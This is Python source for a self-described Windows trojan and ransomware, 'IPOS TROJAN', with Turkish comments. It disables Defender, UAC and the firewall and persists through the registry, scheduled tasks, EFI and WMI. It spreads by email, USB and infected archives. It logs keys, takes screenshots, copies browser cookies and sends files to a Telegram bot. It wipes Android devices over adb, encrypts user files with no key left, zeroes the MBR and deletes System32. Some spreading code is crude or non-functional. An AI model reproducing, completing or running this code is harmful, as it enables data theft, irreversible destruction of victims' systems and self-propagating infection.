import os
import sys
import random
import base64
import ctypes
import subprocess
import shutil
import time
import requests
from pathlib import Path

# ============================================================
# MSGBOX ONAY
# ============================================================
def msgbox(title, msg, flag=0x4 | 0x20):
    return ctypes.windll.user32.MessageBoxW(0, msg, title, flag) == 6

if not msgbox("IPOS TROJAN - UYARI", "BU BIR SAKA DEGILDIR.\nBU KOTU AMACLI BIR YAZILIMDIR.\nBILGISAYARINIZA KALICI ZARAR VEREBILIR."):
    sys.exit()
if not msgbox("IPOS TROJAN - ONAY", "DEVAM ETMEK ISTIYOR MUSUNUZ?\nBu islem geri alinamaz."):
    sys.exit()
if not msgbox("IPOS TROJAN - SON UYARI", "SON UYARI: BILGISAYARINIZ OLECEK!\nGERCEKTEN DEVAM ETMEK ISTIYOR MUSUNUZ?"):
    sys.exit()

ctypes.windll.user32.MessageBoxW(0, "BENDEN GÜNAH GİTTİ...", "IPOS TROJAN", 0x40)

# ============================================================
# ANAHTAR
# ============================================================
key = ''.join(chr(random.randint(0,255)) for _ in range(32))

# ============================================================
# BASE64 + XOR ŞİFRELEME
# ============================================================
def encrypt(content):
    enc = bytes([content[i] ^ ord(key[i % len(key)]) for i in range(len(content))])
    return base64.b64encode(enc).decode()

def walk_dir(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            ext = file.split('.')[-1].lower()
            if ext in ['txt','docx','pdf','jpg','png','zip','xlsx','pptx','mp4','mp3','py','cpp','exe','dll']:
                try:
                    with open(os.path.join(root, file), 'rb') as f:
                        data = f.read()
                    enc = encrypt(data)
                    with open(os.path.join(root, file + '.ipos'), 'w') as f:
                        f.write(enc)
                    os.remove(os.path.join(root, file))
                except:
                    pass

# ============================================================
# GÜVENLİK KAPATMA
# ============================================================
subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('sc stop WinDefend', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('netsh advfirewall set allprofiles state off', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# KALICILIK (Registry + Scheduled Task + UEFI + WMI)
# ============================================================
exe_path = sys.argv[0]
subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v IPOS /t REG_SZ /d "{exe_path}" /f', shell=True, stderr=subprocess.DEVNULL)
subprocess.run(f'schtasks /create /tn IPOS /tr "{exe_path}" /sc onstart /f', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('mountvol X: /s', shell=True, stderr=subprocess.DEVNULL)
subprocess.run(f'copy "{exe_path}" X:\\EFI\\Boot\\bootx64.efi', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('mountvol X: /d', shell=True, stderr=subprocess.DEVNULL)

# WMI Kalıcılık (Format sonrası USB ile geri gelir)
wmi_cmd = 'wmic /namespace:\\\\root\\subscription path __EventFilter create Name="IPOS_PERSIST" /v /f'
subprocess.run(wmi_cmd, shell=True, stderr=subprocess.DEVNULL)
wmi_cmd2 = 'wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name="IPOS_RUN" CommandLineTemplate="C:\\Windows\\IPOS_TROJAN.exe" /v /f'
subprocess.run(wmi_cmd2, shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# DNS ZEHİRLEME (15+ site)
# ============================================================
subprocess.run('attrib -r -s -h C:\\Windows\\System32\\drivers\\etc\\hosts', shell=True, stderr=subprocess.DEVNULL)
with open('C:\\Windows\\System32\\drivers\\etc\\hosts', 'a') as f:
    for site in ['www.google.com','www.youtube.com','www.facebook.com','www.twitter.com','www.instagram.com','www.tiktok.com','www.avast.com','www.kaspersky.com','www.mcafee.com','www.norton.com','www.oculus.com','www.meta.com','www.discord.com','www.github.com','www.roblox.com']:
        f.write(f'127.0.0.1 {site}\n')
subprocess.run('attrib +r +s +h C:\\Windows\\System32\\drivers\\etc\\hosts', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# E-POSTA YAYILIMI (Outlook)
# ============================================================
vbs = '''
Dim objOutlook, objNamespace, objMail
Set objOutlook = CreateObject("Outlook.Application")
Set objNamespace = objOutlook.GetNamespace("MAPI")
Set objMail = objOutlook.CreateItem(0)
objMail.To = "contacts"
objMail.Subject = "Sistem Guncellemesi"
objMail.Body = "Merhaba, bu onemli bir guvenlik guncellemesidir. Ekteki dosyayi calistirin."
objMail.Attachments.Add "{}"
objMail.Send
'''.format(exe_path)
with open(os.path.join(os.environ['USERPROFILE'], 'Desktop', 'mail.vbs'), 'w') as f:
    f.write(vbs)
subprocess.run('cscript "{}"'.format(os.path.join(os.environ['USERPROFILE'], 'Desktop', 'mail.vbs')), shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# USB WORM (LNK + AUTORUN)
# ============================================================
for drive in [chr(i)+':' for i in range(68, 91)]:
    if os.path.exists(drive + '\\'):
        shutil.copy(exe_path, drive + '\\IPOS_TROJAN.exe')
        with open(drive + '\\autorun.inf', 'w') as f:
            f.write('[AutoRun]\nopen=IPOS_TROJAN.exe\naction=Click to run system update\n')
        # Sahte klasör kısayolu (LNK) oluştur
        for folder in ['Belgelerim', 'Muzik', 'Resimler', 'Oyunlar']:
            lnk_path = drive + '\\' + folder + '.lnk'
            with open(lnk_path, 'w') as f:
                f.write('[InternetShortcut]\nURL=cmd.exe /c start IPOS_TROJAN.exe\n')
        subprocess.run(f'attrib +h +s +r {drive}\\IPOS_TROJAN.exe', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f'attrib +h +s +r {drive}\\autorun.inf', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# AĞ YAYILIMI (192.168 + Hamachi + Radmin)
# ============================================================
for i in range(1, 255):
    subprocess.Popen(f'ping -n 1 192.168.1.{i}', shell=True, stderr=subprocess.DEVNULL)
for a in range(1, 255):
    for b in range(1, 255):
        subprocess.Popen(f'ping -n 1 25.{a}.{b}.1', shell=True, stderr=subprocess.DEVNULL)
        subprocess.Popen(f'ping -n 1 26.{a}.{b}.1', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# HESAP SİLME (GitHub + Discord + Roblox)
# ============================================================
try:
    requests.post('https://api.github.com/graphql', headers={'Authorization': 'token ghp_xxxx'}, json={'query': 'mutation { deleteUser(input: { userId: "kullanici_adi" }) { clientMutationId } }'})
except:
    pass
try:
    requests.delete('https://discord.com/api/v9/users/@me', headers={'Authorization': 'MTEwNDU2...'})
except:
    pass
try:
    requests.post('https://auth.roblox.com/v2/logout', headers={'Cookie': '.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE...'}, json={'password':'test123'})
except:
    pass

# ============================================================
# ŞARJ BOZMA (Laptop)
# ============================================================
subprocess.run('sc stop ACPI', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('sc config ACPI start= disabled', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('takeown /f C:\\Windows\\System32\\drivers\\battery.sys', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('del /f /q C:\\Windows\\System32\\drivers\\battery.sys', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# CPU ZORLAMA
# ============================================================
for _ in range(4):
    subprocess.Popen('cmd /c "for /l %i in (1,1,9999999) do set /a x=%i*%i"', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# SPYWARE (Keylog, Screenshot, Cookie, Wi-Fi)
# ============================================================
# Keylogger
subprocess.Popen('powershell -windowstyle hidden -command "$log = \'C:\\Windows\\Temp\\ipos_keylog.txt\'; Add-Type -AssemblyName System.Windows.Forms; $hook = [System.Windows.Forms.Application]::AddMessageFilter([System.Windows.Forms.IMessageFilter]{PreFilterMessage = { param($m) if ($m.Msg -eq 0x100) { $key = [System.Windows.Forms.Keys]$m.WParam; Add-Content -Path $log -Value \\\"$(Get-Date) - $key\\\" } $false }}); [System.Windows.Forms.Application]::Run()"', shell=True, stderr=subprocess.DEVNULL)
# Screenshot
subprocess.Popen('powershell -windowstyle hidden -command "Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save(\'C:\\Windows\\Temp\\ipos_scr.png\')"', shell=True, stderr=subprocess.DEVNULL)
# Cookies
for cookie in ['Chrome', 'Edge']:
    subprocess.run(f'copy "%LOCALAPPDATA%\\Google\\{cookie}\\User Data\\Default\\Network\\Cookies" "C:\\Windows\\Temp\\ipos_{cookie.lower()}.db"', shell=True, stderr=subprocess.DEVNULL)
# Wi-Fi
subprocess.run('netsh wlan show profiles > C:\\Windows\\Temp\\ipos_wifi.txt', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# TELEGRAM C2
# ============================================================
token = '8549434210:AAEBmWeAiDD1i352kHdLd3pd-oWLujJD3SU'
chat_id = '123456789'
try:
    requests.post(f'https://api.telegram.org/bot{token}/sendDocument', data={'chat_id': chat_id, 'caption': 'Keylog'}, files={'document': open('C:\\Windows\\Temp\\ipos_keylog.txt', 'rb')})
except:
    pass
try:
    requests.post(f'https://api.telegram.org/bot{token}/sendPhoto', data={'chat_id': chat_id, 'caption': 'Screenshot'}, files={'photo': open('C:\\Windows\\Temp\\ipos_scr.png', 'rb')})
except:
    pass

# ============================================================
# ANDROİD (QUEST) SİSTEM SİL (ADB)
# ============================================================
subprocess.run('where adb', shell=True, stderr=subprocess.DEVNULL)
# ADB var mı kontrol et (yoksa atla)
adb_path = shutil.which('adb')
if adb_path:
    subprocess.run('adb devices > C:\\Windows\\Temp\\adb_devices.txt', shell=True, stderr=subprocess.DEVNULL)
    # Eğer cihaz bağlıysa sistem dosyalarını sil
    subprocess.run('adb shell rm -rf /system/*', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('adb shell rm -rf /vendor/*', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('adb shell rm -rf /data/*', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('adb shell pm disable com.oculus.systemux', shell=True, stderr=subprocess.DEVNULL)
    subprocess.run('adb shell reboot bootloader', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# ISO + ZIP + RAR BULAŞTIRMA (7Z ile)
# ============================================================
subprocess.run('where 7z', shell=True, stderr=subprocess.DEVNULL)
seven_zip = shutil.which('7z')
if seven_zip:
    # Tüm sürücülerde ISO, ZIP, RAR ara
    for drive in [chr(i)+':' for i in range(67, 91)]:
        if os.path.exists(drive + '\\'):
            for root, dirs, files in os.walk(drive + '\\'):
                for file in files:
                    if file.lower().endswith(('.iso', '.zip', '.rar')):
                        try:
                            file_path = os.path.join(root, file)
                            # Arşivi aç
                            subprocess.run(f'7z x "{file_path}" -oC:\\Windows\\Temp\\arc_work -y', shell=True, stderr=subprocess.DEVNULL)
                            # Virüsü ekle
                            shutil.copy(exe_path, 'C:\\Windows\\Temp\\arc_work\\IPOS_TROJAN.exe')
                            # Yeniden paketle
                            ext = file.split('.')[-1]
                            if ext.lower() == 'iso':
                                subprocess.run(f'7z a -tiso "{file_path}.infected.iso" C:\\Windows\\Temp\\arc_work\\* -mx9 -y', shell=True, stderr=subprocess.DEVNULL)
                            elif ext.lower() == 'zip':
                                subprocess.run(f'7z a -tzip "{file_path}.infected.zip" C:\\Windows\\Temp\\arc_work\\* -mx9 -y', shell=True, stderr=subprocess.DEVNULL)
                            elif ext.lower() == 'rar':
                                subprocess.run(f'7z a -trar "{file_path}.infected.rar" C:\\Windows\\Temp\\arc_work\\* -mx9 -y', shell=True, stderr=subprocess.DEVNULL)
                            shutil.rmtree('C:\\Windows\\Temp\\arc_work', ignore_errors=True)
                        except:
                            pass

# ============================================================
# DOSYA ŞİFRELEME
# ============================================================
user = os.path.expanduser('~')
for folder in ['Desktop', 'Documents', 'Pictures', 'Downloads', 'Videos', 'Music']:
    walk_dir(os.path.join(user, folder))

# ============================================================
# FİDYE NOTU
# ============================================================
with open(os.path.join(user, 'Desktop', 'FIDYE_NOTU.txt'), 'w') as f:
    f.write("IPOS TROJAN - RANSOMWARE\nDosyalariniz .ipos uzantisiyla sifrelendi.\nMBR, Boot ve System32 silindi.\nAndroid sistem coktu.\nISO/ZIP/RAR dosyalarina bulasildi.\nKurtarma anahtari YOKTUR.\nSisteminiz sonsuza kadar kullanilamaz.\n")

# ============================================================
# MBR + BOOT + SYSTEM32 SİL
# ============================================================
try:
    with open(r'\\.\PhysicalDrive0', 'wb') as f:
        f.write(b'\x00' * 512)
except:
    pass
subprocess.run('takeown /f C:\\bootmgr', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('del /f /q C:\\bootmgr', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('takeown /f C:\\Windows\\System32\\winload.exe', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('del /f /q C:\\Windows\\System32\\winload.exe', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('takeown /f C:\\Windows\\System32 /r /d y', shell=True, stderr=subprocess.DEVNULL)
subprocess.run('rmdir /s /q C:\\Windows\\System32', shell=True, stderr=subprocess.DEVNULL)

# ============================================================
# BSOD
# ============================================================
subprocess.run('taskkill /f /im csrss.exe', shell=True, stderr=subprocess.DEVNULL)